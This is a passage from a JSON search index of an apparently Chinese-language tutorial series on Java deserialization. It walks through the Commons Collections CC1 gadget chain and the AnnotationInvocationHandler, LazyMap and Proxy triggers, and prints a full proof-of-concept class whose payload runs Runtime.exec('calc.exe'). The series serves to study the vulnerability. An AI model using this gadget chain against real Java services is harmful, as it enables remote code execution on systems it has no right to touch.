}","title":"InvokerTransformer"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#chainedtransformer","text":"ChainedTransformer\u4e5f\u662f\u5b9e\u73b0\u4e86Transformer\u63a5\u2f1d\u7684\u2f00\u4e2a\u7c7b\uff0c\u5b83\u7684\u4f5c\u2f64\u662f\u5c06\u5185\u90e8\u7684\u591a\u4e2aTransformer\u4e32 \u5728\u2f00\u8d77\u3002\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\uff0c\u524d\u2f00\u4e2a\u56de\u8c03\u8fd4\u56de\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u540e\u2f00\u4e2a\u56de\u8c03\u7684\u53c2\u6570\u4f20\u2f0a\uff0c\u6211\u4eec\u753b\u2f00\u4e2a\u56fe\u505a\u793a\u610f\uff1a","title":"ChainedTransformer"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#\u7406\u89e3demo","text":"\u5f53\u6211\u4eec\u7406\u89e3\u4e0a\u9762\u51e0\u4e2a\u7c7b\u7684\u4f5c\u7528\u4e4b\u540e\uff0cDemo\u7684\u4ee3\u7801\u5c31\u975e\u5e38\u5bb9\u6613\u7406\u89e3\u4e86\uff0c\u5176\u5b9e\u9645\u4e0a\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4: 1. \u521b\u5efa\u4e86\u4e00\u4e2a\u94fe\u5f0f\u7684Transformer( ChainedTransformer )\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e24\u4e2aTransformer( ConstantTransformer \u548c InvokerTransformer )\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u6267\u884c Runtime.exec \u65b9\u6cd5 2. \u521b\u5efaHashMap\u5b9e\u4f8b\uff0c\u5e76\u7528 TransformedMap.decorate \u6765\u5305\u88c5HashMap\uff0c\u5f53\u53d1\u751fvalue\u8f6c\u6362\u7684\u65f6\u5019\u56de\u8c03 ChainedTransformer 3. \u4f7f\u7528 HashMap.out \u65b9\u6cd5\u5f80Map\u4e2d\u653e\u5165\u65b0\u5143\u7d20\uff0c\u89e6\u53d1\u56de\u8c03","title":"\u7406\u89e3Demo"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc74 # CC1 # \u53cd\u5e8f\u5217\u5316\u7bc73\u7ed9\u6211\u4eec\u7559\u4e0b\u4e86\u51e0\u4e2a\u95ee\u9898\uff0c\u4e0a\u7bc7\u7684\u6781\u7b80demo\u5e76\u4e0d\u80fd\u7f16\u5199\u6210\u53cd\u5e8f\u5217\u5316\u7684poc\uff0c\u95ee\u9898\u4e3b\u8981\u662f: \u6211\u4eec\u4f9d\u9760HashMap.put\u65b9\u6cd5\u6765\u89e6\u53d1\u6211\u4eec\u7684\u94fe\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u529e\u6cd5\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u624b\u5de5\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u5b9e\u9645\u53cd\u5e8f\u5217\u5316\u65f6\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u5176\u53cd\u5e8f\u5217\u5316\u7684readObject\u903b\u8f91\u4e2d\u6709\u7c7b\u4f3c\u7684\u5199\u5165\u64cd\u4f5c\u3002 AnnotationInvocationHandler # \u8fd9\u4e2a\u7c7b\u5c31\u662f\u6211\u4eec\u8981\u5bfb\u627e\u7684\u7c7b\uff0c\u5176readObject\u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b(jdk8u71\u4e4b\u524d): private void readObject ( java . io . ObjectInputStream s ) throws java . io . IOException , ClassNotFoundException { s . defaultReadObject (); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null ; try { annotationType = AnnotationType . getInstance ( type ); } catch ( IllegalArgumentException e ) { // Class is no longer an annotation type; time to punch out throw new java . io . InvalidObjectException ( \"Non-annotation type in annotation serial stream\" ); } Map < String , Class <?>> memberTypes = annotationType . memberTypes (); // If there are annotation members without values, that // situation is handled by the invoke method. for ( Map . Entry < String , Object > memberValue : memberValues . entrySet ()) { String name = memberValue . getKey (); Class <?> memberType = memberTypes . get ( name ); if ( memberType != null ) { // i.e. member still exists Object value = memberValue . getValue (); if ( ! ( memberType . isInstance ( value ) || value instanceof ExceptionProxy )) { memberValue . setValue ( new AnnotationTypeMismatchExceptionProxy ( value . getClass () + \"[\" + value + \"]\" ). setMember ( annotationType . members (). get ( name ))); } } } } \u6838\u5fc3\u903b\u8f91\u5c31\u662f Map.Entry<String, Object> memberValue : memberValues.entrySet() \u548c memberValue.setValue(...) \u3002 memberValues\u5c31\u662f\u53cd\u5e8f\u5217\u5316\u540e\u5f97\u5230\u7684Map\uff0c\u4e5f\u662f\u7ecf\u8fc7\u4e86TransformedMap\u4fee\u9970\u7684\u5bf9\u8c61\uff0c\u8fd9\u91cc\u904d\u5386\u4e86\u5b83\u7684\u6240\u6709\u5143\u7d20\uff0c\u5e76\u4f9d\u6b21\u8bbe\u7f6e\u503c\u3002\u5728\u8c03\u7528setValue\u8bbe\u7f6e\u503c\u7684\u65f6\u5019\u5c31\u4f1a\u89e6\u53d1TransformedMap\u91cc\u6ce8\u518c\u7684 Transform\uff0c\u8fdb\u800c\u6267\u884c\u6211\u4eec\u4e3a\u5176\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u4efb\u610f\u4ee3\u7801\u3002 \u6240\u4ee5\u6211\u4eec\u6700\u540e\u9700\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5c31\u662f\u8fd9\u4e2a AnnotationInvocationHandler \uff0c\u7531\u4e8e\u6b64\u7c7b\u662fJDK\u5185\u90e8\u7c7b\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4f7f\u7528\u53cd\u5c04\u6765\u83b7\u53d6\u8be5\u7c7b\u5b9e\u4f8b\u3002 AnnotationInvocationHandler\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2aAnnotation\u7c7b\uff0c\u7b2c\u4e8c\u4e2a\u662f\u53c2\u6570\u5c31\u662f\u524d\u9762\u6784\u9020\u7684Map\u3002\u8fd9\u91cc\u7b2c\u4e00\u4e2a\u53c2\u6570\u8981\u4f7f\u7528\u4ec0\u4e48Annotation\u7c7b\u5462\uff1f\u4ed4\u7ec6\u9605\u8bfb\u6e90\u7801\u53d1\u73b0\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 memberType!=null \u6210\u7acb\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u4e2a\u6761\u4ef6: 1. \u5fc5\u987b\u662f Annotation\u7684\u5b50\u7c7b\uff0c\u4e14\u5176\u4e2d\u5fc5\u987b\u542b\u6709\u81f3\u5c11\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5047\u8bbe\u65b9\u6cd5\u540d\u662fX 2. \u88abTransformedMap.decorate\u4fee\u9970\u7684Map\u4e2d\u5fc5\u987b\u6709\u4e00\u4e2a\u952e\u540d\u4e3aX\u7684\u5143\u7d20 \u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u9009\u62e9\u4e86Retention\u7c7b\uff0c\u5176\u5177\u6709\u4e00\u4e2avalue\u65b9\u6cd5\uff0c\u540e\u7eed\u6211\u4eec\u9700\u8981\u5f80HashMap\u4e2d\u653e\u5165\u4e00\u4e2akey\u4e3avalue\u7684\u503c\u3002 Class clazz = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ); Constructor construct = clazz . getDeclaredConstructor ( Class . class , Map . class ); construct . setAccessible ( true ); Object obj = construct . newInstance ( Retention . class , outerMap ); \u53cd\u5c04\u6784\u9020java.Runtime # \u5f53\u6211\u4eec\u5c06\u4ee3\u7801\u4fee\u6539\u597d\u4e4b\u540e\uff0c\u4f1a\u53d1\u73b0\u4f9d\u7136\u65e0\u6cd5\u5c06\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u7684obj\u5e8f\u5217\u5316\uff0c\u539f\u56e0\u662f java.lang.Runtime \u662f\u6ca1\u529e\u6cd5\u5e8f\u5217\u5316\u7684\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u53cd\u5c04\u6280\u672f\u6765\u6700\u7ec8\u62ff\u5230\u8be5\u7c7b: Method f = Runtime . class . getMethod ( \"getRuntime\" ); Runtime r = ( Runtime ) f . invoke ( null ); r . exec ( \"calc.exe\" ); \u6240\u4ee5\u6211\u4eec\u9700\u8981\u4fee\u6539Transformer\uff0c\u4ee3\u7801\u5982\u4e0b: Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; \u5176\u5b9e\u548cdemo\u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u5c06Runtime.getRuntime()\u6362\u6210\u4e86Runtime.class\uff0c\u524d\u8005\u662f\u4e00\u4e2a java.lang.Runtime\u5bf9\u8c61\uff0c\u540e\u8005\u662f\u4e00\u4e2ajava.lang.Class\u5bf9\u8c61\u3002Class\u7c7b\u6709\u5b9e\u73b0Serializable\u63a5\u53e3\uff0c\u6240\u4ee5\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316\u3002 \u9ad8\u7248\u672c\u9650\u5236 # \u6211\u4eec\u8fd9\u91cc\u7684payload\u662f\u65e0\u6cd5\u5728jdk>=8u71\u4e0a\u89e6\u53d1\u7684\uff0c\u8fd9\u662f\u7531\u4e8e AnnotationInvokeHandle.readObject \u5728\u6b64\u7248\u672c\u505a\u4e86\u4fee\u6539: \u5177\u4f53\u7684\u89e3\u51b3\u529e\u6cd5\u5728\u4e0b\u4e00\u7bc7\u6587\u7ae0\u4e2d\u3002 \u603b\u7ed3 # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: AnnotationInvocationHandler.readObject() HashMap.setValue() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u53cd\u5e8f\u5217\u5316\u7bc74"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/#\u53cd\u5e8f\u5217\u5316\u7bc74","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc74"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/#cc1","text":"\u53cd\u5e8f\u5217\u5316\u7bc73\u7ed9\u6211\u4eec\u7559\u4e0b\u4e86\u51e0\u4e2a\u95ee\u9898\uff0c\u4e0a\u7bc7\u7684\u6781\u7b80demo\u5e76\u4e0d\u80fd\u7f16\u5199\u6210\u53cd\u5e8f\u5217\u5316\u7684poc\uff0c\u95ee\u9898\u4e3b\u8981\u662f: \u6211\u4eec\u4f9d\u9760HashMap.put\u65b9\u6cd5\u6765\u89e6\u53d1\u6211\u4eec\u7684\u94fe\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u529e\u6cd5\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u624b\u5de5\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u5b9e\u9645\u53cd\u5e8f\u5217\u5316\u65f6\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u5176\u53cd\u5e8f\u5217\u5316\u7684readObject\u903b\u8f91\u4e2d\u6709\u7c7b\u4f3c\u7684\u5199\u5165\u64cd\u4f5c\u3002","title":"CC1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/#annotationinvocationhandler","text":"\u8fd9\u4e2a\u7c7b\u5c31\u662f\u6211\u4eec\u8981\u5bfb\u627e\u7684\u7c7b\uff0c\u5176readObject\u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b(jdk8u71\u4e4b\u524d): private void readObject ( java . io . ObjectInputStream s ) throws java . io . IOException , ClassNotFoundException { s . defaultReadObject (); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null ; try { annotationType = AnnotationType . getInstance ( type ); } catch ( IllegalArgumentException e ) { // Class is no longer an annotation type; time to punch out throw new java . io . InvalidObjectException ( \"Non-annotation type in annotation serial stream\" ); } Map < String , Class <?>> memberTypes = annotationType . memberTypes (); // If there are annotation members without values, that // situation is handled by the invoke method. for ( Map . Entry < String , Object > memberValue : memberValues . entrySet ()) { String name = memberValue . getKey (); Class <?> memberType = memberTypes . get ( name ); if ( memberType != null ) { // i.e. member still exists Object value = memberValue . getValue (); if ( ! ( memberType . isInstance ( value ) || value instanceof ExceptionProxy )) { memberValue . setValue ( new AnnotationTypeMismatchExceptionProxy ( value . getClass () + \"[\" + value + \"]\" ). setMember ( annotationType . members (). get ( name ))); } } } } \u6838\u5fc3\u903b\u8f91\u5c31\u662f Map.Entry<String, Object> memberValue : memberValues.entrySet() \u548c memberValue.setValue(...) \u3002 memberValues\u5c31\u662f\u53cd\u5e8f\u5217\u5316\u540e\u5f97\u5230\u7684Map\uff0c\u4e5f\u662f\u7ecf\u8fc7\u4e86TransformedMap\u4fee\u9970\u7684\u5bf9\u8c61\uff0c\u8fd9\u91cc\u904d\u5386\u4e86\u5b83\u7684\u6240\u6709\u5143\u7d20\uff0c\u5e76\u4f9d\u6b21\u8bbe\u7f6e\u503c\u3002\u5728\u8c03\u7528setValue\u8bbe\u7f6e\u503c\u7684\u65f6\u5019\u5c31\u4f1a\u89e6\u53d1TransformedMap\u91cc\u6ce8\u518c\u7684 Transform\uff0c\u8fdb\u800c\u6267\u884c\u6211\u4eec\u4e3a\u5176\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u4efb\u610f\u4ee3\u7801\u3002 \u6240\u4ee5\u6211\u4eec\u6700\u540e\u9700\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5c31\u662f\u8fd9\u4e2a AnnotationInvocationHandler \uff0c\u7531\u4e8e\u6b64\u7c7b\u662fJDK\u5185\u90e8\u7c7b\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4f7f\u7528\u53cd\u5c04\u6765\u83b7\u53d6\u8be5\u7c7b\u5b9e\u4f8b\u3002 AnnotationInvocationHandler\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2aAnnotation\u7c7b\uff0c\u7b2c\u4e8c\u4e2a\u662f\u53c2\u6570\u5c31\u662f\u524d\u9762\u6784\u9020\u7684Map\u3002\u8fd9\u91cc\u7b2c\u4e00\u4e2a\u53c2\u6570\u8981\u4f7f\u7528\u4ec0\u4e48Annotation\u7c7b\u5462\uff1f\u4ed4\u7ec6\u9605\u8bfb\u6e90\u7801\u53d1\u73b0\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 memberType!=null \u6210\u7acb\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u4e2a\u6761\u4ef6: 1. \u5fc5\u987b\u662f Annotation\u7684\u5b50\u7c7b\uff0c\u4e14\u5176\u4e2d\u5fc5\u987b\u542b\u6709\u81f3\u5c11\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5047\u8bbe\u65b9\u6cd5\u540d\u662fX 2. \u88abTransformedMap.decorate\u4fee\u9970\u7684Map\u4e2d\u5fc5\u987b\u6709\u4e00\u4e2a\u952e\u540d\u4e3aX\u7684\u5143\u7d20 \u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u9009\u62e9\u4e86Retention\u7c7b\uff0c\u5176\u5177\u6709\u4e00\u4e2avalue\u65b9\u6cd5\uff0c\u540e\u7eed\u6211\u4eec\u9700\u8981\u5f80HashMap\u4e2d\u653e\u5165\u4e00\u4e2akey\u4e3avalue\u7684\u503c\u3002 Class clazz = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ); Constructor construct = clazz . getDeclaredConstructor ( Class . class , Map . class ); construct . setAccessible ( true ); Object obj = construct . newInstance ( Retention . class , outerMap );","title":"AnnotationInvocationHandler"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/#\u53cd\u5c04\u6784\u9020javaruntime","text":"\u5f53\u6211\u4eec\u5c06\u4ee3\u7801\u4fee\u6539\u597d\u4e4b\u540e\uff0c\u4f1a\u53d1\u73b0\u4f9d\u7136\u65e0\u6cd5\u5c06\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u7684obj\u5e8f\u5217\u5316\uff0c\u539f\u56e0\u662f java.lang.Runtime \u662f\u6ca1\u529e\u6cd5\u5e8f\u5217\u5316\u7684\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u53cd\u5c04\u6280\u672f\u6765\u6700\u7ec8\u62ff\u5230\u8be5\u7c7b: Method f = Runtime . class . getMethod ( \"getRuntime\" ); Runtime r = ( Runtime ) f . invoke ( null ); r . exec ( \"calc.exe\" ); \u6240\u4ee5\u6211\u4eec\u9700\u8981\u4fee\u6539Transformer\uff0c\u4ee3\u7801\u5982\u4e0b: Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; \u5176\u5b9e\u548cdemo\u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u5c06Runtime.getRuntime()\u6362\u6210\u4e86Runtime.class\uff0c\u524d\u8005\u662f\u4e00\u4e2a java.lang.Runtime\u5bf9\u8c61\uff0c\u540e\u8005\u662f\u4e00\u4e2ajava.lang.Class\u5bf9\u8c61\u3002Class\u7c7b\u6709\u5b9e\u73b0Serializable\u63a5\u53e3\uff0c\u6240\u4ee5\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316\u3002","title":"\u53cd\u5c04\u6784\u9020java.Runtime"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/#\u9ad8\u7248\u672c\u9650\u5236","text":"\u6211\u4eec\u8fd9\u91cc\u7684payload\u662f\u65e0\u6cd5\u5728jdk>=8u71\u4e0a\u89e6\u53d1\u7684\uff0c\u8fd9\u662f\u7531\u4e8e AnnotationInvokeHandle.readObject \u5728\u6b64\u7248\u672c\u505a\u4e86\u4fee\u6539: \u5177\u4f53\u7684\u89e3\u51b3\u529e\u6cd5\u5728\u4e0b\u4e00\u7bc7\u6587\u7ae0\u4e2d\u3002","title":"\u9ad8\u7248\u672c\u9650\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/#\u603b\u7ed3","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: AnnotationInvocationHandler.readObject() HashMap.setValue() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc75 # CC1 # \u4ee3\u66ffTransformedMap\u7684LazyMap\u53ca\u5176\u89e6\u53d1\u65b9\u5f0f # \u5728ysoserial\u4e2d\uff0cCC1\u7684\u94fe\u5176\u5b9e\u662f\u7528 LazyMap \u800c\u4e0d\u662f TransformedMap \u89e6\u53d1\u7684\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u662fTransformedMap\u662f\u5728\u5199\u5165\u5143\u7d20\u7684\u65f6\u5019\u6267\u884ctransform\uff0c\u800cLazyMap\u662f\u5728\u5176get\u65b9\u6cd5\u4e2d\u6267\u884c\u7684transform\u3002 public Object get ( Object key ) { // create value for key if key is not currently in the map if ( map . containsKey ( key ) == false ) { Object value = factory . transform ( key ); map . put ( key , value ); return value ; } return map . get ( key ); } \u90a3\u4e48\u5982\u4f55\u89e6\u53d1 LazyMap.get \u65b9\u6cd5\u5462\uff1f AnnotationInvocationHandler.Invoke \u7ed9\u5230\u4e86\u7b54\u6848: \u90a3\u4e48\u53c8\u662f\u4e00\u4e2a\u5957\u5a03\u95ee\u9898\uff0c\u5982\u4f55\u89e6\u53d1 AnnotationInvocationHandler.invoke \u5462\uff1f\u7b54\u6848\u662f\u4f7f\u7528java\u5bf9\u8c61\u4ee3\u7406\u3002 java\u5bf9\u8c61\u4ee3\u7406 # \u8fd9\u91ccP\u725b\u7684pdf\u8bf4\u7684\u5f88\u6e05\u695a\u4e86\uff0c\u5c31\u4e0d\u9700\u8981\u8865\u5145\u4e86\uff0c\u6700\u540e\u4ee3\u7801\u5982\u4e0b: package top.longlone ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.LazyMap ; import org.apache.commons.collections.map.TransformedMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.annotation.Retention ; import java.lang.reflect.Constructor ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Method ; import java.lang.reflect.Proxy ; import java.util.HashMap ; import java.util.Map ; public class Hello { public static void main ( String [] args ) throws Exception { Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; Transformer transformerChain = new ChainedTransformer ( transformers ); Map innerMap = new HashMap (); innerMap . put ( \"value\" , \"xxxx\" ); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); Class clazz = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ); Constructor constructor = clazz . getDeclaredConstructor ( Class . class , Map . class ); constructor . setAccessible ( true ); InvocationHandler handler = ( InvocationHandler ) constructor . newInstance ( Retention . class , outerMap ); Map proxyMap = ( Map ) Proxy . newProxyInstance ( Map . class . getClassLoader (), new Class [] { Map . class }, handler ); handler = ( InvocationHandler ) constructor . newInstance ( Retention . class , proxyMap ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( handler ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u603b\u7ed3 # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u53cd\u5e8f\u5217\u5316\u7bc75"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/#\u53cd\u5e8f\u5217\u5316\u7bc75","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc75"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/#cc1","text":"","title":"CC1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/#\u4ee3\u66fftransformedmap\u7684lazymap\u53ca\u5176\u89e6\u53d1\u65b9\u5f0f","text":"\u5728ysoserial\u4e2d\uff0cCC1\u7684\u94fe\u5176\u5b9e\u662f\u7528 LazyMap \u800c\u4e0d\u662f TransformedMap \u89e6\u53d1\u7684\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u662fTransformedMap\u662f\u5728\u5199\u5165\u5143\u7d20\u7684\u65f6\u5019\u6267\u884ctransform\uff0c\u800cLazyMap\u662f\u5728\u5176get\u65b9\u6cd5\u4e2d\u6267\u884c\u7684transform\u3002 public Object get ( Object key ) { // create value for key if key is not currently in the map if ( map . containsKey ( key ) == false ) { Object value = factory . transform ( key ); map . put ( key , value ); return value ; } return map . get ( key ); } \u90a3\u4e48\u5982\u4f55\u89e6\u53d1 LazyMap.get \u65b9\u6cd5\u5462\uff1f AnnotationInvocationHandler.Invoke \u7ed9\u5230\u4e86\u7b54\u6848: \u90a3\u4e48\u53c8\u662f\u4e00\u4e2a\u5957\u5a03\u95ee\u9898\uff0c\u5982\u4f55\u89e6\u53d1 AnnotationInvocationHandler.invoke \u5462\uff1f\u7b54\u6848\u662f\u4f7f\u7528java\u5bf9\u8c61\u4ee3\u7406\u3002","title":"\u4ee3\u66ffTransformedMap\u7684LazyMap\u53ca\u5176\u89e6\u53d1\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/#java\u5bf9\u8c61\u4ee3\u7406","text":"\u8fd9\u91ccP\u725b\u7684pdf\u8bf4\u7684\u5f88\u6e05\u695a\u4e86\uff0c\u5c31\u4e0d\u9700\u8981\u8865\u5145\u4e86\uff0c\u6700\u540e\u4ee3\u7801\u5982\u4e0b: package top.longlone ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.LazyMap ; import org.apache.commons.collections.map.TransformedMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.annotation.Retention ; import java.lang.reflect.Constructor ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Method ; import java.lang.reflect.Proxy ; import java.util.HashMap ; import java.util.Map ; public class Hello { public static void main ( String [] args ) throws Exception { Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; Transformer transformerChain = new ChainedTransformer ( transformers ); Map innerMap = new HashMap (); innerMap . put ( \"value\" , \"xxxx\" ); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); Class clazz = 